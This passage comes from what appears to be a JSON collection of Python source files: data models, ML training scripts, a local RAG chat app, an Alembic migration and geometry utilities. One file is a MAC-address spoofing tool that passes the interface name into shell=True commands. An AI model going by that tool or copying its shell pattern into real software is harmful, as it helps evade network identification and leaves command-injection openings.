np.isclose(auc, 0.625, atol=1e-4)\n",
    "import datetime\n\nfrom sqlmodel import SQLModel, Field, Relationship\nimport uuid\n\nclass PlantBase(SQLModel):\n    name: str\n    description: str\n\nclass PlantCreate(PlantBase):\n    pass\n\nclass Plant(PlantBase, table=True):\n    id: uuid.UUID = Field(default_factory=uuid.uuid4, primary_key=True)\n    stats: list[\"PlantStat\"] = Relationship(back_populates=\"plant\", cascade_delete=True)\n\n\n# -------------------------------- #\n#            Statistics            #\n# -------------------------------- #\n\n# Stats Base, which includes a timestamp, an entry for soil moisture and light\nclass PlantStatBase(SQLModel):\n    timestamp: datetime.datetime = datetime.datetime.now()\n    soil_moisture: float\n    light: float\n\nclass PlantStatsCreate(PlantStatBase):\n    pass\n\nclass PlantStat(PlantStatBase, table=True):\n    id: uuid.UUID = Field(default_factory=uuid.uuid4, primary_key=True)\n    plant_id: uuid.UUID = Field(foreign_key=\"plant.id\", nullable=False, ondelete=\"CASCADE\")\n    plant = Relationship(back_populates=\"stats\")\n\nclass PlantStatPublic(PlantStatBase):\n    id: uuid.UUID\n    plant_id: uuid.UUID\n\nclass PlantStatsPublic(SQLModel):\n    data: list[PlantStatPublic]\n    count: int",
    "import accelerate\nimport re\nimport torch\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\nimport datasets\nfrom rl_trainer import GRPOTrainer\nfrom trl import GRPOConfig\nimport logging\nlogging.basicConfig(\n    format=\"%(asctime)s - %(levelname)s - %(name)s - %(message)s\",\n    datefmt=\"%m/%d/%Y %H:%M:%S\",\n    level=logging.INFO,\n)\ndummy_data_file = \"/home/yueyulin/data/MetaMathQA-395K-processed.jsonl\"\n# \u521b\u5efa\u6570\u636e\u96c6\ndataset = datasets.load_dataset(\"json\", data_files=dummy_data_file)[\"train\"]\n\ndef reward_function(inputs):\n    \"\"\"\u8ba1\u7b97\u5956\u52b1\u51fd\u6570\n    \n    \u5982\u679c\u6a21\u578b\u751f\u6210\u7684\u7b54\u6848\u4e2d\u5305\u542b\u6b63\u786e\u7b54\u6848\uff08\u683c\u5f0f\u4e3a \\boxed{answer}\uff09\uff0c\u5219\u7ed9\u4e88\u5956\u52b1 1\uff0c\u5426\u5219\u4e3a 0\n    \u7b54\u6848\u662f\u5426\u5305\u542b\\nthinking\\n \\nthinking ends\\n \u5bf9\u548c\n    \\nanswer\\n \\nanswer ends\\n\u5bf9\n    \"\"\"\n    rewards = []\n    for input_data in inputs:\n        completion = input_data['completion']\n        ground_truth = input_data['ground_truth']\n        reward = 0\n        #\u5982\u679c\u5305\u542b\\nthinking\\n \\nthinking ends\\n\n        index = completion.find(\"thinking\\n\")\n        if index != -1:\n            next_index = completion.find(\"thinking ends\\n\")\n            if next_index != -1:\n                reward += 0.2\n            else:\n                reward += 0.1\n        #\u5982\u679c\u5305\u542b\\nanswer\\n \\nanswer ends\\n\n        index = completion.find(\"answer\\n\")\n        if index != -1:\n            next_index = completion.find(\"answer ends\\n\")\n            if next_index != -1:\n                reward += 0.2\n            else:\n                reward += 0.1\n        #\u5982\u679c\u6b63\u786e\u7b54\u6848\u5728\\boxed{}\u4e2d\uff0c+0.2\\boxed{3}\n        boxed_ground_truth = f'\\\\boxed{{{ground_truth}}}'\n        if boxed_ground_truth in completion:\n            reward += 0.6\n        rewards.append(reward)\n    return torch.tensor(rewards, dtype=torch.float)\n\ndef main():\n    accelerator = accelerate.Accelerator()\n    # \u521d\u59cb\u5316\u6a21\u578b\u548ctokenizer\n    model_name = \"/home/yueyulin/models/Qwen2.5-0.5B-Instruct/\"\n    model = AutoModelForCausalLM.from_pretrained(\n        model_name,\n        device_map={\"\": accelerator.device},\n        torch_dtype=torch.float16,\n    )\n    tokenizer = AutoTokenizer.from_pretrained(model_name)\n    \n    \n    # \u914d\u7f6e\u8bad\u7ec3\u53c2\u6570\n    training_args = GRPOConfig(\n        output_dir=\"/tmp/math-solver-grpo\",\n        num_train_epochs=3,\n        per_device_train_batch_size=1,\n        gradient_accumulation_steps=1,\n        learning_rate=1e-5,\n        weight_decay=0.01,\n        max_prompt_length=512,\n        max_completion_length=1024,\n        num_generations=4,  # \u6bcf\u4e2a\u95ee\u9898\u751f\u62104\u4e2a\u56de\u7b54\n        temperature=0.7,\n        beta=0.1,  # KL\u6563\u5ea6\u7684\u6743\u91cd\n        logging_steps=100,\n        save_strategy=\"epoch\",\n        evaluation_strategy=\"no\",\n        report_to=\"tensorboard\",\n        no_cuda=False,\n        fp16=False,\n        bf16=True\n    )\n    print(dataset)\n    print(dataset[0])\n    # \u521d\u59cb\u5316trainer\n    trainer = GRPOTrainer(\n        model=model,\n        reward_function=reward_function,\n        args=training_args,\n        train_dataset=dataset,\n        processing_class=tokenizer,\n    )\n    trainer = accelerator.prepare(trainer)\n    # \u5f00\u59cb\u8bad\u7ec3\n    trainer.train()\n    \n    # \u4fdd\u5b58\u6a21\u578b\n    trainer.save_model()\n\nif __name__ == \"__main__\":\n    main()",
    "import os\r\n\r\nimport gc\r\nimport tempfile\r\nimport uuid\r\nimport pandas as pd\r\n\r\nfrom llama_index.core import Settings\r\nfrom llama_index.llms.ollama import Ollama\r\nfrom llama_index.core import PromptTemplate\r\nfrom llama_index.embeddings.huggingface import HuggingFaceEmbedding\r\nfrom llama_index.core import VectorStoreIndex, SimpleDirectoryReader\r\nfrom llama_index.readers.docling import DoclingReader\r\nfrom llama_index.core.node_parser import MarkdownNodeParser\r\n\r\nimport streamlit as st\r\n\r\nif \"id\" not in st.session_state:\r\n    st.session_state.id = uuid.uuid4()\r\n    st.session_state.file_cache = {}\r\n\r\nsession_id = st.session_state.id\r\nclient = None\r\n\r\n@st.cache_resource\r\ndef load_llm():\r\n    llm = Ollama(model=\"llama3.2-vision\", request_timeout=120.0)\r\n    return llm\r\n\r\ndef reset_chat():\r\n    st.session_state.messages = []\r\n    st.session_state.context = None\r\n    gc.collect()\r\n\r\n\r\ndef display_excel(file):\r\n    st.markdown(\"### Excel Preview\")\r\n    # Read the Excel file\r\n    df = pd.read_excel(file)\r\n    # Display the dataframe\r\n    st.dataframe(df)\r\n\r\n\r\nwith st.sidebar:\r\n    st.header(f\"Add your documents!\")\r\n    \r\n    uploaded_file = st.file_uploader(\"Choose your `.xlsx` file\", type=[\"xlsx\", \"xls\", \"csv\"])\r\n\r\n    if uploaded_file:\r\n        try:\r\n            with tempfile.TemporaryDirectory() as temp_dir:\r\n                file_path = os.path.join(temp_dir, uploaded_file.name)\r\n                \r\n                with open(file_path, \"wb\") as f:\r\n                    f.write(uploaded_file.getvalue())\r\n                \r\n                file_key = f\"{session_id}-{uploaded_file.name}\"\r\n                st.write(\"Indexing your document...\")\r\n\r\n                if file_key not in st.session_state.get('file_cache', {}):\r\n\r\n                    if os.path.exists(temp_dir):\r\n                            reader = DoclingReader()\r\n                            loader = SimpleDirectoryReader(\r\n                                input_dir=temp_dir,\r\n                                file_extractor={\".xlsx\": reader},\r\n                            )\r\n                    else:    \r\n                        st.error('Could not find the file you uploaded, please check again...')\r\n                        st.stop()\r\n                    \r\n                    docs = loader.load_data()\r\n\r\n                    # setup llm & embedding model\r\n                    llm=load_llm()\r\n                    embed_model = HuggingFaceEmbedding( model_name=\"BAAI/bge-large-en-v1.5\", trust_remote_code=True)\r\n                    # Creating an index over loaded data\r\n                    Settings.embed_model = embed_model\r\n                    node_parser = MarkdownNodeParser()\r\n                    index = VectorStoreIndex.from_documents(documents=docs, transformations=[node_parser], show_progress=True)\r\n\r\n                    # Create the query engine, where we use a cohere reranker on the fetched nodes\r\n                    Settings.llm = llm\r\n                    query_engine = index.as_query_engine(streaming=True)\r\n\r\n                    # ====== Customise prompt template ======\r\n                    qa_prompt_tmpl_str = (\r\n                    \"Context information is below.\\n\"\r\n                    \"---------------------\\n\"\r\n                    \"{context_str}\\n\"\r\n                    \"---------------------\\n\"\r\n                    \"Given the context information above I want you to think step by step to answer the query in a highly precise and crisp manner focused on the final answer, incase case you don't know the answer say 'I don't know!'.\\n\"\r\n                    \"Query: {query_str}\\n\"\r\n                    \"Answer: \"\r\n                    )\r\n                    qa_prompt_tmpl = PromptTemplate(qa_prompt_tmpl_str)\r\n\r\n                    query_engine.update_prompts(\r\n                        {\"response_synthesizer:text_qa_template\": qa_prompt_tmpl}\r\n                    )\r\n                    \r\n                    st.session_state.file_cache[file_key] = query_engine\r\n                else:\r\n                    query_engine = st.session_state.file_cache[file_key]\r\n\r\n                # Inform the user that the file is processed and Display the PDF uploaded\r\n                st.success(\"Ready to Chat!\")\r\n                display_excel(uploaded_file)\r\n        except Exception as e:\r\n            st.error(f\"An error occurred: {e}\")\r\n            st.stop()     \r\n\r\ncol1, col2 = st.columns([6, 1])\r\n\r\nwith col1:\r\n    st.header(f\"RAG over Excel using IBM Dockling \ud83d\udc25 &  Llama-3.2 100% Locally\")\r\n\r\nwith col2:\r\n    st.button(\"Clear \u21ba\", on_click=reset_chat)\r\n\r\n# Initialize chat history\r\nif \"messages\" not in st.session_state:\r\n    reset_chat()\r\n\r\n\r\n# Display chat messages from history on app rerun\r\nfor message in st.session_state.messages:\r\n    with st.chat_message(message[\"role\"]):\r\n        st.markdown(message[\"content\"])\r\n\r\n\r\n# Accept user input\r\nif prompt := st.chat_input(\"What's up?\"):\r\n    # Add user message to chat history\r\n    st.session_state.messages.append({\"role\": \"user\", \"content\": prompt})\r",
    "from enum import Enum\nfrom datetime import datetime\nfrom typing import Dict, Any, List, Callable\n\nfrom pydantic import BaseModel\n\nfrom cat.log import log\n\n\nclass FormEvent(Enum):\n\n    # Lifecycle events\n    FORM_INITIALIZED = \"form_initialized\"\n    FORM_SUBMITTED = \"form_submitted\"\n    FORM_CLOSED = \"form_closed\"\n\n    # Extraction events\n    EXTRACTION_STARTED = \"extraction_started\"\n    EXTRACTION_COMPLETED = \"extraction_completed\"\n\n    # Validation events\n    VALIDATION_STARTED = \"validation_started\"\n    VALIDATION_COMPLETED = \"validation_completed\"\n\n    FIELD_UPDATED = \"field_updated\"\n\n    # Tool events\n    TOOL_STARTED = \"tool_started\"\n    TOOL_EXECUTED = \"tool_executed\"\n    TOOL_FAILED = \"tool_failed\"\n\n\nclass FormEventContext(BaseModel):\n    timestamp: datetime\n    form_id: str\n    event: FormEvent\n    data: Dict[str, Any]\n\n\nclass FormEventManager:\n    def __init__(self):\n        self._handlers: Dict[FormEvent, List[Callable[[FormEventContext], None]]] = {\n            event: [] for event in FormEvent\n        }\n\n    def on(self, event: FormEvent, handler: Callable[[FormEventContext], None]):\n        \"\"\"Register an event handler\"\"\"\n        self._handlers[event].append(handler)\n\n    def emit(self, event: FormEvent, data: Dict[str, Any], form_id: str):\n        \"\"\"Emit an event to all registered handlers\"\"\"\n        context = FormEventContext(\n            timestamp=datetime.now(),\n            form_id=form_id,\n            event=event,\n            data=data\n        )\n\n        for handler in self._handlers[event]:\n            try:\n                handler(context)\n            except Exception as e:\n                log.error(f\"Error in event handler: {str(e)}\")",
    "import subprocess\nimport random\nimport re\nimport json\nimport os\nimport argparse\nimport textwrap\n\ndef signature():\n    sig = r\"\"\"\n    \u2588\u2588\u2588\u2557   \u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557     \u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557  \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557   \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \n    \u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d    \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n    \u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551         \u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\n    \u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551         \u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n    \u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557    \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\n    \u255a\u2550\u255d     \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d     \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\n    \"\"\"\n    print(sig)\n\ndef change_mac(interface, new_mac=None):\n    try:\n        subprocess.check_call([\"sudo\", \"ifconfig\", interface, \"down\"])\n        if new_mac is None:\n            new_mac = generate_mac_address()\n        subprocess.check_call([\"sudo\", \"ifconfig\", interface, \"hw\", \"ether\", new_mac])\n        subprocess.check_call([\"sudo\", \"ifconfig\", interface, \"up\"])\n    except subprocess.CalledProcessError as e:\n        print(f\"Error changing MAC address: {e}\")\n        exit(1)\n\ndef load_mac(interface):\n    try:\n        if os.path.exists(\"mac.json\"):\n            with open(\"mac.json\", \"r\") as f:\n                mac = json.load(f)\n                subprocess.check_call([\"sudo\", \"ifconfig\", interface, \"down\"])\n                subprocess.check_call([\"sudo\", \"ifconfig\", interface, \"hw\", \"ether\", mac[\"mac\"]])\n                subprocess.check_call([\"sudo\", \"ifconfig\", interface, \"up\"])\n    except Exception as e:\n        print(f\"Error loading MAC address: {e}\")\n        exit(1)\n    \ndef generate_mac_address():\n    mac = [\n        random.randint(0x00, 0xFF),\n        random.randint(0x00, 0xFF),\n        random.randint(0x00, 0xFF),\n        random.randint(0x00, 0xFF),\n        random.randint(0x00, 0xFF),\n        random.randint(0x00, 0xFF),\n    ]\n    mac[0] &= 0xFC\n    return \":\".join(f\"{byte:02x}\" for byte in mac)\n\ndef preserve_mac(interface):\n    try:\n        result = subprocess.run(f\"ip link show {interface} | awk '/ether/ {{print $2}}'\", shell=True, capture_output=True, check=True)\n        with open(\"mac.json\", \"w\") as f:\n            json.dump({\"mac\": result.stdout.decode().strip()}, f)\n    except Exception as e:\n        print(f\"Error preserving MAC address: {e}\")\n        exit(1)\n\ndef get_current_mac(interface):\n    try:\n        result = subprocess.run(f\"ip link show {interface} | awk '/ether/ {{print $2}}'\", shell=True, stdout=subprocess.PIPE, check=True)\n        return result.stdout.decode().strip()\n    except subprocess.CalledProcessError as e:\n        print(f\"Error getting current MAC address: {e}\")\n        exit(1)\n\ndef is_valid_mac(mac):\n    if mac is None:\n        return True\n    pattern = r'^(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$' \n    return re.match(pattern, mac) is not None\n\ndef get_arguments():\n    # to display help message in a more readable format help:(https://docs.python.org/3/library/argparse.html)\n    parser = argparse.ArgumentParser(\n        prog=\"PyMacChanger\", \n        formatter_class= argparse.RawDescriptionHelpFormatter,\n        description=textwrap.dedent('''\\\n                    -----------------------------------------------------\n        ----> PyMacChanger is a tool to change MAC address of a network interface.\n        ----> It can also generate random MAC address or restore original MAC address.\n                    ------------------------------------------------------\n        '''),\n        epilog=\"Developed by AGT Cyber\")\n    parser.add_argument(\"-i\", \"--interface\", dest=\"interface\", required=True, help=\"Interface to change its MAC address(mandatory)\")\n    parser.add_argument(\"-m\", \"--mac\", dest=\"new_mac\", help=\"New MAC address(optional if -r is specified)\")\n    parser.add_argument(\"-o\", \"--original\", dest=\"original_mac\", action=\"store_true\", help=\"Restore original MAC address\")\n    parser.add_argument(\"-r\", \"--random\", dest=\"random\", action=\"store_true\", help=\"Generate random MAC address\")\n    parser.add_argument(\"-p\", \"--preserve\", dest=\"preserve\", action=\"store_true\", help=\"Preserve current MAC address\")\n    parser.add_argument(\"-cli\", \"--cli\", dest=\"cli\", action=\"store_true\", help=\"Command line GUI\")\n    args = parser.parse_args()\n    \n    if args.new_mac and not is_valid_mac(args.new_mac):\n        parser.error(\"Invalid MAC address. Please use the following format: xx:xx:xx:xx:x:xx\")\n    \n    return args\n\ndef main():\n    signature()\n    args = get_arguments()\n    if args.preserve:\n        preserve_mac(args.interface)\n    \n    if args.cli:\n        while True:\n            print(\"1. Change MAC Address\")\n            print(\"2. Generate Random MAC\")\n            print(\"3. Restore Original MAC\")\n            print(\"4. Exit\")\n            choice = input(\"Choose an option: \")\n            if choice == '1':\n                if not is_valid_mac(args.new_mac):\n                    print(\"[-] Invalid MAC address, use --help",
    "from stable_baselines3 import PPO\nfrom stable_baselines3.common.env_util import make_vec_env\nimport os\nimport requests\n\n# Configuration constants\nAILIVE_SECRET_APIKEY = \"EXAMPLEKEY-zero-walking\"\nSAVE_INTERVAL = 500_000  # Save every 500,000 steps\nTOTAL_TIMESTEPS = 10_000_000  # Total steps for training\nVIEW_LOGS = False\nRENDER_MODE = False  # Set to True to visualize the environment\n\n# Extract agent and skill names from API key\ntry:\n    agent_name, skill_name = AILIVE_SECRET_APIKEY.split(\"-\")[1:]\nexcept ValueError:\n    raise ValueError(\"Invalid API key format. Expected format: <prefix>-<agent_name>-<skill_name>.\")\n\n# Paths for saving TensorBoard logs and models\nTENSORBOARD_PATH = os.path.join(\".\", \"sessions\", agent_name, skill_name, \"tensorboard\")\nMODELS_PATH = os.path.join(\".\", \"sessions\", agent_name, skill_name, \"models\")\n\n# Ensure directories exist\nos.makedirs(TENSORBOARD_PATH, exist_ok=True)\nos.makedirs(MODELS_PATH, exist_ok=True)\n\ndef get_presigned_url():\n    \"\"\"\n    Fetch a pre-signed URL from the API for uploading the model.\n    \"\"\"\n    url = \"https://api.ailive.co/v1/upload/sign_url\"\n    payload = {\"api\": AILIVE_SECRET_APIKEY}\n    headers = {\"Content-Type\": \"application/json\"}\n\n    try:\n        response = requests.post(url, json=payload, headers=headers)\n        response.raise_for_status()\n        response_data = response.json()\n\n        if not response_data.get(\"success\", False):\n            print(f\"Error fetching pre-signed URL: {response_data.get('message', 'Unknown error')}\")\n            return None\n\n        return response_data.get(\"url\")\n    except requests.RequestException as e:\n        print(f\"Request error while fetching pre-signed URL: {e}\")\n        return None\n\ndef upload_model(file_path):\n    \"\"\"\n    Upload the model to the server using a pre-signed URL.\n    \"\"\"\n    presigned_url = get_presigned_url()\n    if not presigned_url:\n        print(\"Failed to get a pre-signed URL. Skipping upload.\")\n        return False\n\n    try:\n        with open(file_path, \"rb\") as file:\n            response = requests.put(presigned_url, data=file)\n            response.raise_for_status()\n            print(f\"Model uploaded successfully to {presigned_url}.\")\n            return True\n    except requests.RequestException as e:\n        print(f\"Error during model upload: {e}\")\n        return False\n\ndef save_model(model, step_count):\n    \"\"\"\n    Save the model locally and upload it to the server.\n    \"\"\"\n    file_name = f\"{step_count}.zip\"\n    file_path = os.path.join(MODELS_PATH, file_name)\n\n    model.save(file_path)\n    print(f\"Model saved locally: {file_path}\")\n\n    if not upload_model(file_path):\n        print(\"Upload failed. Model saved locally for future attempts.\")\n\ndef load_latest_model(model):\n    \"\"\"\n    Load the latest saved model if available and return the starting step count.\n    \"\"\"\n    saved_models = [f for f in os.listdir(MODELS_PATH) if f.endswith(\".zip\")]\n\n    if not saved_models:\n        print(\"No pre-trained model found. Starting training from scratch.\")\n        return 0\n\n    latest_model = max(saved_models, key=lambda f: int(f.split(\".\")[0]))\n    model_path = os.path.join(MODELS_PATH, latest_model)\n\n    model.set_parameters(model_path)\n    step_count = int(latest_model.split(\".\")[0])\n    print(f\"Resumed training from saved model: {model_path}. Starting at step {step_count}.\")\n    return step_count\n\ndef main():\n    \"\"\"\n    Main function to set up the environment, train the model, and save progress.\n    \"\"\"\n    # Create the environment with optional rendering\n    if RENDER_MODE:\n        print(\"Warning: Enabling visualization will slow down training.\")\n        env = make_vec_env(\"Humanoid-v5\", env_kwargs={\"render_mode\": \"human\"})\n    else:\n        env = make_vec_env(\"Humanoid-v5\")\n\n    # Initialize the PPO model\n    print(f\"Logging TensorBoard data to: {TENSORBOARD_PATH}\")\n    model = PPO(\"MlpPolicy\", env, verbose=VIEW_LOGS, tensorboard_log=TENSORBOARD_PATH)\n\n    # Load the latest model if available\n    steps_trained = load_latest_model(model)\n\n    print(f\"Starting training for a total of {TOTAL_TIMESTEPS} timesteps.\")\n    while steps_trained < TOTAL_TIMESTEPS:\n        model.learn(total_timesteps=SAVE_INTERVAL, reset_num_timesteps=False, tb_log_name=skill_name)\n        steps_trained += SAVE_INTERVAL\n        save_model(model, steps_trained)\n\n    env.close()\n    print(\"Training completed successfully.\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "\"\"\"Initial revision\n\nRevision ID: ac4d8ec7fab7\nRevises: \nCreate Date: 2024-12-30 20:55:05.249759\n\n\"\"\"\nfrom typing import Sequence, Union\n\nfrom alembic import op\nimport sqlalchemy as sa\n\n\n# revision identifiers, used by Alembic.\nrevision: str = 'ac4d8ec7fab7'\ndown_revision: Union[str, None] = None\nbranch_labels: Union[str, Sequence[str], None] = None\ndepends_on: Union[str, Sequence[str], None] = None\n\n\ndef upgrade() -> None:\n    # ### commands auto generated by Alembic - please adjust! ###\n    op.create_table('bonuses',\n    sa.Column('id', sa.Integer(), nullable=False),\n    sa.Column('min_streak', sa.Integer(), nullable=False),\n    sa.Column('bonus_cm', sa.Integer(), nullable=False),\n    sa.Column('bonus_attempts', sa.Integer(), nullable=False),\n    sa.PrimaryKeyConstraint('id')\n    )\n    op.create_table('promocodes',\n    sa.Column('code_id', sa.Integer(), nullable=False),\n    sa.Column('uses_left', sa.Integer(), nullable=False),\n    sa.Column('length', sa.Integer(), nullable=False),\n    sa.PrimaryKeyConstraint('code_id')\n    )\n    op.create_table('users',\n    sa.Column('user_id', sa.Integer(), nullable=False),\n    sa.Column('username', sa.String(), nullable=True),\n    sa.Column('first_name', sa.String(), nullable=True),\n    sa.Column('length', sa.Integer(), nullable=False),\n    sa.Column('last_grow', sa.Date(), nullable=False),\n    sa.Column('bonus_attempts', sa.Integer(), nullable=False),\n    sa.Column('grow_streak', sa.Integer(), nullable=False),\n    sa.PrimaryKeyConstraint('user_id')\n    )\n    op.create_table('uses_of_promo',\n    sa.Column('id', sa.Integer(), nullable=False),\n    sa.Column('user_id', sa.Integer(), nullable=False),\n    sa.Column('code_id', sa.Integer(), nullable=False),\n    sa.ForeignKeyConstraint(['code_id'], ['promocodes.code_id'], ),\n    sa.ForeignKeyConstraint(['user_id'], ['users.user_id'], ),\n    sa.PrimaryKeyConstraint('id')\n    )\n    # ### end Alembic commands ###\n\n\ndef downgrade() -> None:\n    # ### commands auto generated by Alembic - please adjust! ###\n    op.drop_table('uses_of_promo')\n    op.drop_table('users')\n    op.drop_table('promocodes')\n    op.drop_table('bonuses')\n    # ### end Alembic commands ###\n",
    "import json\nimport logging\nimport os\nimport re\nfrom dataclasses import dataclass, field\nfrom functools import cached_property\nfrom typing import Any, Callable, Generator, Optional, Self\n\nimport numpy as np\nimport torch\nfrom scipy.spatial.transform import Rotation\nfrom sklearn.cluster import DBSCAN\n\nfrom ovfgvg.data.visualization.bbox import save_bounding_box\nfrom ovfgvg.utils import rescale, encode_mask, decode_mask\n\n\n@dataclass\nclass OrientedBBox:\n    \"\"\"\n    Dataclass for oriented bounding box.\n\n    Parametrization is based on the center of the box, the half-dimensions along each axis, and the rotation of the\n    box. If a rotation is not specified, the object is equivalent to an axis-aligned bounding box (AABB).\n    \"\"\"\n\n    center: np.ndarray  # [3, ]\n    half_dims: np.ndarray  # [3, ]\n    rotation: Rotation = field(default_factory=lambda: Rotation.from_matrix(np.eye(3)))\n\n    @property\n    def dimensions(self):\n        return 2 * self.half_dims\n\n    def contains(self, points: np.ndarray) -> np.ndarray:\n        \"\"\"Returns mask over points which are contained within the bounding box.\"\"\"\n\n        assert points.shape[1] == 3\n\n        centered_pts = points - self.center\n        oriented_pts = self.rotation.apply(centered_pts, inverse=True)\n        return np.all(np.abs(oriented_pts) < self.half_dims, axis=1)\n\n    @classmethod\n    def from_dict(cls, data):\n        return cls(\n            center=np.array(data[\"center\"]),\n            half_dims=np.array(data[\"half_dims\"]),\n            rotation=Rotation.from_quat(np.array(data[\"rotation\"])),\n        )\n\n    def to_dict(self):\n        return {\n            \"center\": self.center.tolist(),\n            \"half_dims\": self.half_dims.tolist(),\n            \"rotation\": self.rotation.as_quat().tolist(),\n        }\n\n    def to_array(self):\n        return np.concatenate([self.center, self.half_dims, self.rotation.as_quat()])\n\n    @classmethod\n    def from_array(cls, arr: np.ndarray) -> Self:\n        return cls(\n            center=arr[:3],\n            half_dims=arr[3:6],\n            rotation=Rotation.from_quat(arr[6:]),\n        )\n\n    def to_ply(self, output: str):\n        save_bounding_box(output, self.center, self.half_dims, self.rotation.as_matrix())\n\n    @classmethod\n    def from_mask(cls, coords: np.ndarray) -> Self:\n        xmin = np.min(coords[:, 0])\n        ymin = np.min(coords[:, 1])\n        zmin = np.min(coords[:, 2])\n        xmax = np.max(coords[:, 0])\n        ymax = np.max(coords[:, 1])\n        zmax = np.max(coords[:, 2])\n\n        centroid = np.array([(xmin + xmax) / 2, (ymin + ymax) / 2, (zmin + zmax) / 2])\n        dimensions = np.array([xmax - xmin, ymax - ymin, zmax - zmin])\n\n        return OrientedBBox(center=centroid, half_dims=dimensions / 2)\n\n    @classmethod\n    def cluster_boxes(\n        cls, coords: np.ndarray, epsilon: float = 0.05, min_samples: int = 15\n    ) -> tuple[list[Self], np.ndarray]:\n        \"\"\"Extracts oriented bounding boxes from point cloud based on mask.\"\"\"\n        dbscan = DBSCAN(eps=epsilon, min_samples=min_samples)\n        clusters = dbscan.fit(coords)\n        labels = clusters.labels_\n\n        # Initialize empty lists to store centroids and extends of each cluster\n        boxes = []\n\n        for cluster_id in set(labels):\n            if cluster_id == -1:  # Ignore noise\n                continue\n\n            members = coords[labels == cluster_id]\n            boxes.append(cls.from_mask(members))\n\n        return boxes, labels\n\n\n@dataclass\nclass LabeledOrientedBBox(OrientedBBox):\n    id: str = None\n    label: str | int = None\n\n    def __post_init__(self):\n        if self.id is None or self.label is None:\n            raise ValueError(\n                \"Must specify an id or label. If neither is needed, consider using an OrientedBBox instead.\"\n            )\n\n    @classmethod\n    def from_dict(cls, data):\n        return cls(\n            id=data[\"id\"],\n            label=data[\"label\"],\n            center=np.array(data[\"center\"]),\n            half_dims=np.array(data[\"half_dims\"]),\n            rotation=Rotation.from_quat(np.array(data[\"rotation\"])),\n        )\n\n    def to_dict(self):\n        return {\n            \"id\": self.id,\n            \"label\": self.label,\n            **super().to_dict(),\n        }\n\n    @classmethod\n    def from_box(cls, id: str, label: str | int, box: OrientedBBox) -> Self:\n        return cls(\n            id=id,\n            label=label,\n            center=box.center,\n            half_dims=box.half_dims,\n            rotation=box.rotation,\n        )\n\n    def get_box(self) -> OrientedBBox:\n        return OrientedBBox(center=self.center, half_dims=self.half_dims, rotation=self.rotation)\n\n    @classmethod\n    def from_mask(cls, id: str, label: str | int, coords: np.ndarray) -> Self:\n        box = OrientedBBox.from_mask(coords)\n        return cls.from_box(id, label, box)\n\n    @classmethod\n    def cluster_boxes(\n        cls, coords: np.ndarray, epsilon: float = 0.05, min_samples: int = 15\n    ) -> tuple[list[Self], np.ndarray]:\n        \"\"",
